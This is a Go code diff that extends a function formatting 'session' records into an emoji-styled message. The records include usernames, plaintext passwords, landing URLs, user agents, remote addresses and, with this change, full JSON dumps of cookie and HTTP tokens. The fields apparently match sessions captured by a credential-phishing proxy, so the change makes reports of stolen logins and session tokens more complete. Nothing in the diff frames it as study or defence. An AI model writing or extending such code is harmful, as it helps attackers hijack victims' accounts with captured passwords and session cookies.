@@ -1,10 +1,17 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 )
 
 func formatSessionMessage(session Session) string {
+	// Convert maps to JSON for better readability in the output
+	custom, _ := json.MarshalIndent(session.Custom, "", "  ")
+	bodyTokens, _ := json.MarshalIndent(session.BodyTokens, "", "  ")
+	httpTokens, _ := json.MarshalIndent(session.HTTPTokens, "", "  ")
+	tokens, _ := json.MarshalIndent(session.Tokens, "", "  ")
+
 	return fmt.Sprintf("✨ **Session Information** ✨\n\n"+
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
@@ -13,7 +20,11 @@ func formatSessionMessage(session Session) string {
 		"🖥️ User Agent:    ➖ %s\n"+
 		"🌍 Remote Address:➖ %s\n"+
 		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n",
+		"🕔 Update Time:   ➖ %d\n\n"+
+		"📦 Custom Data:\n%s\n"+
+		"🗂️ Body Tokens:\n%s\n"+
+		"🗄️ HTTP Tokens:\n%s\n"+
+		"🔑 Tokens:\n%s\n",
 		session.Username,
 		session.Password,
 		session.LandingURL,
@@ -22,6 +33,10 @@ func formatSessionMessage(session Session) string {
 		session.RemoteAddr,
 		session.CreateTime,
 		session.UpdateTime,
+		string(custom),
+		string(bodyTokens),
+		string(httpTokens),
+		string(tokens),
 	)
 }
 
